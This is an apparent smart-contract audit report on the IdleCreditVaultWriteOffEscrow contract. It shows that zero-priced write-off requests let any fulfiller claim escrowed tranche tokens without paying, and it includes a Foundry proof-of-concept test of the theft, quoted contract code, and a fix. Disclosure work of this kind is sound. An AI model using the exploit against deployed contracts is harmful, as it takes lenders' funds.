### Title
Zero-priced write-off requests let any fulfiller steal escrowed tranche tokens - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary
`createWriteOffRequest` requires a non-zero tranche deposit but accepts `underlyingsRequested == 0`. `fullfillWriteOffRequest` then permits fulfillment with `_underlyings == 0` because zero is not less than the requested amount. Any unprivileged fulfiller can therefore claim the victim’s entire escrowed tranche balance without paying any underlying.

### Finding Description
A lender can escrow `amount > 0` tranche tokens while recording an underlying ask of zero. `createWriteOffRequest` validates only `amount == 0`, stores the supplied price verbatim, and increases `pendingUnderlyings` by the zero-valued ask. [1](#0-0) 

During fulfillment, the contract requires the fulfiller to buy the complete tranche amount, but checks only that `_underlyings` is at least `currentRequest.underlyings`. For a zero-priced request, `_underlyings = 0` satisfies this check. The contract consequently performs a zero-token pull, calculates a zero exit fee, transfers zero underlying to the lender, and transfers all escrowed tranche tokens to the attacker. [2](#0-1) 

The broken invariant is that an escrowed write-off request must require positive consideration before releasing collateral. This is the closest credit-vault analog to accepting a syntactically valid but semantically unsafe attacker-controlled payload: malformed user input is accepted by the request parser and later interpreted as authorization to transfer the escrowed asset.

### Impact Explanation
An attacker can steal every tranche token held in any request whose recorded underlying ask is zero. The theft requires only one call to `fullfillWriteOffRequest` while the epoch is running and the request remains open. The stolen tranche tokens represent the victim’s credit-vault position and may later be used for withdrawal requests or borrower write-off flows according to their normal rights.

The attacker does not need owner, manager, guardian, borrower, Keyring-admin, or queue privileges. The attacker only needs to be an ordinary write-off fulfiller, an explicitly permitted unprivileged role.

### Likelihood Explanation
The exploit is deterministic once a zero-priced request exists. The contract permits such a request, exposes fulfilment to any wallet, and does not require the fulfiller to possess or approve any underlying. Standard ERC-20 implementations accept a zero-value `transferFrom` without allowance, so the payment step does not stop the attack.

Likelihood depends on a lender submitting a zero-priced request accidentally or through a malformed client payload. That precondition reduces reachability compared with a purely attacker-created request, but the absence of validation turns one malformed request into an immediate and complete loss of the escrowed tranches.

### Recommendation
Reject zero-value consideration when creating a write-off request:

```solidity
if (underlyingsRequested == 0) revert NotAllowed();
```

Add the check beside the existing `amount == 0` validation in `createWriteOffRequest`. For additional safety, `fullfillWriteOffRequest` should explicitly reject `_underlyings == 0` before deleting the request and transferring tranche tokens.

### Proof of Concept
The following test can be added to the existing `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol` fixture, assuming it exposes the deployed `escrow`, `cdoEpoch`, `AAtranche`, `underlying`, `manager`, `lender`, and `fulfiller` variables used by that suite:

```solidity
function testFulfillerStealsZeroPricedWriteOffRequest() external {
    uint256 tranches = 100 * ONE_TRANCHE;

    // Requests can only be opened during a running epoch.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // Victim escrows a non-zero tranche amount but supplies a zero ask.
    vm.startPrank(lender);
    AAtranche.approve(address(escrow), tranches);
    escrow.createWriteOffRequest(tranches, 0);
    vm.stopPrank();

    uint256 victimBefore = AAtranche.balanceOf(lender);
    uint256 fulfillerBefore = AAtranche.balanceOf(fulfiller);

    // Zero underlying satisfies `0 >= underlyingsRequested`.
    vm.prank(fulfiller);
    escrow.fullfillWriteOffRequest(lender, tranches, 0);

    assertEq(AAtranche.balanceOf(lender), victimBefore);
    assertEq(AAtranche.balanceOf(fulfiller), fulfillerBefore + tranches);
    assertEq(AAtranche.balanceOf(address(escrow)), 0);
    assertEq(underlying.balanceOf(lender), 0);
}
```

The request can also be created by a lending contract or integration on behalf of a wallet holding tranche tokens. In either case, no privileged actor initiates the theft: the victim only supplies the malformed request, while the fulfiller executes the unauthorized-value transfer.

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
